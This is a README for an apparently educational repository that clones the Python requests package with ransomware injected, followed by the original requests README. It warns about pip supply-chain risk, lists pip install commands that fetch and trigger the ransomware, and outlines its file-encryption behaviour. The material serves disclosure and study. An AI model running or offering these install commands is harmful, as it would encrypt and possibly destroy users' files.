
# MALWARE DISCLOSURE
<span style="color:red">THIS REPOSITORY IS MALWARE! Installation via pip WILL ENCRYPT YOUR FILES.</span>

This repository is a clone of the python requests package with ransomware injected into it. This project is to demonstrate. This repository constitutes `dual use content` per the [github malware policy](https://docs.github.com/en/github/site-policy/github-community-guidelines#active-malware-or-exploits).  

## Purpose

The process in which pip works is flawed. If this package was published to pypi, under a different name with a low levenshtein distance it could have catastrophic consequences. The inherent flaws in the pip package manager are multipronged.  

- pip allows for arbitrary code execution with a single install command.
  - one mistyped letter could cause irreversible damage to a developer's computer
- pypi does not actively scan for malware on their platform
  - some 3rd parties do this with a reactionary approach

This repository is not intended to be published, but to show the dangers and inherent trust that a developer must accept when using a package or library.  
Many popular packages have hundreds of dependencies. The simple and common act of including a single package in a requirements.txt or pip instal means that you trust the code of every one of these hundreds of developers. Numerous instances of supply chain attacks have occurred in recent years and this danger is very real.

## DANGER!

The following commands trigger the malware attack, and should not be run.  
`pip install git+https://github.com/parishwolfe/educational-tool-ransomware`  
`pip3 install git+https://github.com/parishwolfe/educational-tool-ransomware`  
`python3 -m pip install git+https://github.com/parishwolfe/educational-tool-ransomware`  

A decryption tool is installed with this ransomware, the steps to decrypt are as follows:

- navigate to your desktop, and read RANSOM.txt
- copy the encryption key from RANSOM.txt
- navigate to your home directory, there you will find malware.py
- run `python3 malware.py -d encryption_key`

**NOTE** a double encryption scenario is possible, if this occurs, your data will be lost forever!!

The action of this repository is as follows:

- determine the operating system
- recursively operate on `my documents`|`/home/${USER}`|`/Users/${USER}` for windows|linux|mac
- Flag any file with an indication of sensitive information in the filename, (i.e. 2020_tax, mortgage-application, bitcoinWallet)
  - a real malicious script would post these files to some file hosting site
- encrypt all files in the user's documents folder
- show ransom demands (with password to decrypt) as RANSOM.txt on your desktop

## Original Content

---

# Requests

**Requests** is a simple, yet elegant, HTTP library.

```python
>>> import requests
>>> r = requests.get('https://api.github.com/user', auth=('user', 'pass'))
>>> r.status_code
200
>>> r.headers['content-type']
'application/json; charset=utf8'
>>> r.encoding
'utf-8'
>>> r.text
'{"type":"User"...'
>>> r.json()
{'disk_usage': 368627, 'private_gists': 484, ...}
```

Requests allows you to send HTTP/1.1 requests extremely easily. There’s no need to manually add query strings to your URLs, or to form-encode your `PUT` & `POST` data — but nowadays, just use the `json` method!

Requests is one of the most downloaded Python package today, pulling in around `30M downloads / week`— according to GitHub, Requests is currently [depended upon](https://github.com/psf/requests/network/dependents?package_id=UGFja2FnZS01NzA4OTExNg%3D%3D) by `500,000+` repositories. You may certainly put your trust in this code.

[![Downloads](https://pepy.tech/badge/requests/month)](https://pepy.tech/project/requests)
[![Supported Versions](https://img.shields.io/pypi/pyversions/requests.svg)](https://pypi.org/project/requests)
[![Contributors](https://img.shields.io/github/contributors/psf/requests.svg)](https://github.com/psf/requests/graphs/contributors)

## Installing Requests and Supported Versions

Requests is available on PyPI:

```console
$ python -m pip install requests
```

Requests officially supports Python 2.7 & 3.6+.

## Supported Features & Best–Practices

Requests is ready for the demands of building robust and reliable HTTP–speaking applications, for the needs of today.

- Keep-Alive & Connection Pooling
- International Domains and URLs
- Sessions with Cookie Persistence
- Browser-style TLS/SSL Verification
- Basic & Digest Authentication
- Familiar `dict`–like Cookies
- Automatic Content Decompression and Decoding
- Multi-part File Uploads
- SOCKS Proxy Support
- Connection Timeouts
- Streaming Downloads
- Automatic honoring of `.netrc`
- Chunked HTTP Requests

## API Reference and User Guide available on [Read the Docs](https://requests.readthedocs.io)

[![Read the Docs](https://raw.githubusercontent.com/psf/requests/main/ext/ss.png)](https://requests.readthedocs.io)

## Cloning the repository

When cloning the Requests repository, you may need to add the `-c
fetch.fsck.badTimezone=ignore` flag to avoid an error about a bad commit (see
[this issue](https://github.com/psf/requests/issues/2690) for more background):

```shell
git clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git
```

You can also apply this setting to your global Git config:

```shell
git config --global fetch.fsck.badTimezone ignore
```

---

[![Kenneth Reitz](https://raw.githubusercontent.com/psf/requests/main/ext/kr.png)](https://kennethreitz.org) [![Python Software Foundation](https://raw.githubusercontent.com/psf/requests/main/ext/psf.png)](https://www.python.org/psf)
